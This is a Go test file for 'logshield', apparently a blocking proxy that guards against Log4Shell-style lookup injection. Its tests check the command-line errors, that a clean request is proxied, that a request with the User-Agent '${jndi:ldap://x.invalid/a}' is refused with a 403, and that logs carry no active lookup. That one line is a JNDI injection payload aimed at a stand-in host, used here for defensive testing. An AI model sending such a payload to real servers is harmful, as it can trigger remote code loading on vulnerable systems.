package main

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"
)

type syncBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}
func (s *syncBuffer) String() string { s.mu.Lock(); defer s.mu.Unlock(); return s.b.String() }

func TestRunUsageErrors(t *testing.T) {
	tests := []struct {
		name       string
		args       []string
		wantCode   int
		wantStdout string
		wantStderr string
	}{
		{name: "version flag", args: []string{"-version"}, wantCode: 0, wantStdout: "logshield "},
		{name: "upstream is required", args: nil, wantCode: 2, wantStderr: "-upstream is required"},
		{name: "unknown flag", args: []string{"-nope"}, wantCode: 2, wantStderr: "flag provided but not defined"},
		{name: "bad log level", args: []string{"-log-level", "loud", "-upstream", "http://x"}, wantCode: 2, wantStderr: "invalid -log-level"},
		{name: "unparseable upstream", args: []string{"-upstream", "http://[::1"}, wantCode: 2, wantStderr: "invalid -upstream"},
		{name: "invalid configuration reports every problem", args: []string{"-upstream", "ftp://x/p", "-mode", "audit", "-forwarded-for", "x"}, wantCode: 2, wantStderr: "unknown mode"},
		{name: "listen failure", args: []string{"-upstream", "http://127.0.0.1:1", "-listen", "256.0.0.1:99999"}, wantCode: 1, wantStderr: "logshield:"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var out, errb bytes.Buffer
			code := run(context.Background(), tc.args, &out, &errb, nil)
			if code != tc.wantCode {
				t.Errorf("exit code = %d, want %d (stderr %q)", code, tc.wantCode, errb.String())
			}
			if !strings.Contains(out.String(), tc.wantStdout) {
				t.Errorf("stdout = %q, want %q", out.String(), tc.wantStdout)
			}
			if !strings.Contains(errb.String(), tc.wantStderr) {
				t.Errorf("stderr = %q, want %q", errb.String(), tc.wantStderr)
			}
		})
	}
}

// The whole program: start, proxy a clean and a hostile request, shut down.
func TestRunServesAndShutsDown(t *testing.T) {
	hits := 0
	var mu sync.Mutex
	up := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		mu.Lock()
		hits++
		mu.Unlock()
		_, _ = io.WriteString(w, "backend")
	}))
	defer up.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	addrc := make(chan string, 1)
	errb := &syncBuffer{}
	done := make(chan int, 1)
	go func() {
		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", up.URL, "-mode", "block", "-skip-body-type", "image/"}, io.Discard, errb, func(a string) { addrc <- a })
	}()
	var addr string
	select {
	case addr = <-addrc:
	case code := <-done:
		t.Fatalf("exited early with %d: %s", code, errb.String())
	case <-time.After(5 * time.Second):
		t.Fatal("did not start")
	}

	get := func(ua string) int {
		req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "http://"+addr+"/", nil)
		req.Header.Set("User-Agent", ua)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		_ = resp.Body.Close()
		return resp.StatusCode
	}
	if code := get("curl/8"); code != 200 {
		t.Errorf("clean request: %d", code)
	}
	if code := get("${jndi:ldap://x.invalid/a}"); code != 403 {
		t.Errorf("attack: %d", code)
	}
	mu.Lock()
	if hits != 1 {
		t.Errorf("upstream hits = %d, want 1", hits)
	}
	mu.Unlock()

	cancel()
	select {
	case code := <-done:
		if code != 0 {
			t.Errorf("exit code %d: %s", code, errb.String())
		}
	case <-time.After(10 * time.Second):
		t.Fatal("did not shut down")
	}
	logs := errb.String()
	if !strings.Contains(logs, `"msg":"listening"`) || !strings.Contains(logs, `"msg":"request blocked"`) || !strings.Contains(logs, `"msg":"stopped"`) {
		t.Errorf("expected log lines missing:\n%s", logs)
	}
	if strings.Contains(logs, "${") {
		t.Errorf("log contains an active lookup:\n%s", logs)
	}
}

func TestMonitorModeAnnouncesItself(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	errb := &syncBuffer{}
	done := make(chan int, 1)
	ready := make(chan struct{})
	go func() {
		done <- run(ctx, []string{"-listen", "127.0.0.1:0", "-upstream", "http://127.0.0.1:1"}, io.Discard, errb, func(string) { close(ready) })
	}()
	<-ready
	cancel()
	if code := <-done; code != 0 {
		t.Errorf("exit %d", code)
	}
	if !strings.Contains(errb.String(), "monitor mode") {
		t.Errorf("no monitor-mode notice:\n%s", errb.String())
	}
}
